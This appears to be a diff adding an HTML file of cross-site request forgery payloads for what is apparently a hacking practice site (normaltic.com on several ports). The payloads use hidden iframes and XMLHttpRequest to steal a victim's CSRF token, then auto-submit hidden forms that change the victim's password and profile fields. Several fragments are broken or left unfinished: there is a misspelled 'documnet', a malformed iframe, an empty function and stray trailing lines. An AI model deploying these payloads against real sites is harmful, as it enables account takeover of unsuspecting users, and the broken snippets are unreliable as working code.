@@ -1,0 +1,78 @@
+<iframe id="getCSRFToken" src="http://normaltic.com:5002/mypage.php" width="0" height="0" border="0">
+    onload="exploit()"</iframe>
+
+<script>
+    function exploit(){
+        var birthday = "0214";
+        var token = documnet.getElementById("getCSRFToken").contentDocument.forms[0].csrf.value;
+
+    }
+</script>
+
+<iframe width="0" height="0" id="getCSRFToken" style="display: none;" 
+src="http://normaltic.com:5002/mypage.php" onload="exploit()"></iframe>
+
+
+
+
+
+
+<iframe id="hi" src="http://normaltic.com:5001/mypage.php" width="0" height="0" border="0" onload="exploit()" style=" display : none;"></iframe>
+<script>
+    function exploit() {
+        document.writeln('<form width="0" height="0" method="POST" action="http://normaltic.com:5001/mypage_update.php">');
+        document.writeln('<input type="hidden" name="id" value="">');
+        document.writeln('<input type="hidden" name="birthday" value="0214">');
+        document.writeln('<input type="hidden" name="pw" value="1234">');
+        document.writeln('<input type="submit" name="submit" value="Update">');
+        document.writeln('</form>');
+        document.forms[0].submit.click();
+}
+</script>
+
+<iframe id="getCSRFToken" src="http://normaltic.com:5003/mypage.php" width="0" height="0" border="0"  style="display:none;" onload="exploit()" >
+</iframe>
+<script>
+    function exploit() {
+        var token = document.getElementById("getCSRFToken").contentDocument.forms[0].csrf_token.value;
+        document.writeln('<form width="0" height="0" method="POST" action="http://normaltic.com:5003/mypage_update.php">');
+        document.writeln('<input type="hidden" name="id" value="">');
+        document.writeln('<input type="hidden" name="birthday" value="0214">');
+        document.writeln('<input type="hidden" name="pw" value="0214">');
+        document.writeln('<input type="hidden" name="csrf_token" value="' + token + '">');
+        document.writeln('<input type="submit" name="submit" value="Update">');
+        document.writeln('</form>');
+        document.forms[0].submit.click();
+}
+</script>
+
+<form width="0" height="0" id="gettoken" method="POST" action="http://normaltic.com:5002/mypage_update.php">
+    <input id="username" type="text" name="username" value="test">
+    <input id="status" type="checkbox" name="status" checked>
+    <input id="token" type="hidden" name="token" value=token>
+</form>
+
+<script>
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "http://normaltic.com:5002/mypage.php", false);
+
+    xhttp.send();
+    console.log(xhttp.responseText);
+    var token = xhttp.responseText.match(/[abcdef0123456789]{32}/);
+    document.getElementById('token').setAttribute('value', token);
+    console.log(token[0])
+    document.getElementById('profile').submit();
+</script>
+
+<form method="POST" action="http://normaltic.com:5001/mypage_update.php">
+    <input type="hidden" name="birt" value="hacking you">
+    <input type="hidden" name="email" value="i hack you">
+</form>
+<script>
+document.forms[0].submit();
+</script>
+
+
+
+document.forms[0].submit();
+= <body onload= "hack.submit()"
